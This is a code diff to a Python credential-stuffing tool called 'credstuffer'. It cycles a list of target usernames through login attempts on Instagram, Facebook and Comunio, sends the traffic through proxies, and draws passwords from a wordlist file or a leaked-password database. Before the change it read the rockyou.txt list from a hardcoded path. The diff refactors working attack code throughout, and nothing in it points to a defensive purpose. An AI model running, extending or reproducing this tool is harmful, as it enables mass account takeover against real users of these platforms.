@@ -1,13 +1,12 @@
 import logging
 import threading
-from multiprocessing import Process, Pool
+from multiprocessing import Process
 from credstuffer import UserAccount
 from credstuffer.logins import Comunio, Instagram, Facebook
 from credstuffer.proxy import Proxy
-from credstuffer.db import DBFetcher
+from credstuffer.dbhandler import DBHandler
 from credstuffer.exceptions import ProxyMaxRequestError, ProxyBadConnectionError
 from credstuffer import ROOT_DIR
-from time import sleep
 
 usernames = [
     "shagattack",
@@ -24,16 +23,19 @@ usernames = [
 ]
 
 
-class Stuffing:
+class Stuffing(DBHandler):
     """ class Stuffing to execute the credential stuffing algorithm
 
     USAGE:
             stuffing = Stuffing()
 
     """
-    def __init__(self):
+    def __init__(self, filepath=None, **dbparams):
         self.logger = logging.getLogger('credstuffer')
         self.logger.info('create class Stuffing')
+
+        # init base class
+        super().__init__(**dbparams)
 
         self.accounts = []
         # create account instances
@@ -45,6 +47,8 @@ class Stuffing:
         self.proxy = Proxy(timeout_ms=50)
         self.http_str = 'http://'
         self.https_str = 'https://'
+
+        self.filepath = filepath
 
     def get_proxy_dict(self):
         """
@@ -90,16 +94,15 @@ class Stuffing:
 
         :return:
         """
-        threads = []
+        processes = []
         for account in self.accounts:
             # handle user accounts
             if isinstance(account, UserAccount):
 
                 for username in usernames:
+                    print(username)
                     proc = Process(target=self.worker_login, args=(account, username))
-                    #thread = threading.Thread(target=self.worker_login, args=(account, username))
-                    threads.append(proc)
-                    #thread.start()
+                    processes.append(proc)
                     proc.start()
             # handle email accounts
             else:
@@ -117,15 +120,25 @@ class Stuffing:
         # set proxy
         self.set_proxy(account=account)
 
-        # get passwords
-        with open('/home/christian/projects/CredentialDatabase/Collections/rockyou.txt', 'r', encoding='utf-8', errors='ignore') as f:
-            for line in f:
-                password = line.strip('\n')
-                #print(password)
-                # execute login
-                self.execute_login(account=account, username=username, password=password)
+        if self.filepath is not None:
+            # get passwords from file
+            with open(self.filepath, 'r', encoding='utf-8', errors='ignore') as f:
+                for line in f:
+                    password = line.strip('\n')
+                    # execute login
+                    self.execute_login(account=account, username=username, password=password)
 
-                #sleep(1)
+        else:
+            # get passwords from database
+            # iterate over schema
+            #for c_schema in self.schema_list:
+            #    for c_table in self.schema_list:
+            #        passwords_data = self.fetch_data(schema=c_schema, table=c_table)
+            #        for el in passwords_data:
+            #            print(el)
+            passwords_data = self.fetch_data(schema="a", table="g")
+            for el in passwords_data:
+                print(el)
 
 if __name__ == '__main__':
     stuf = Stuffing()
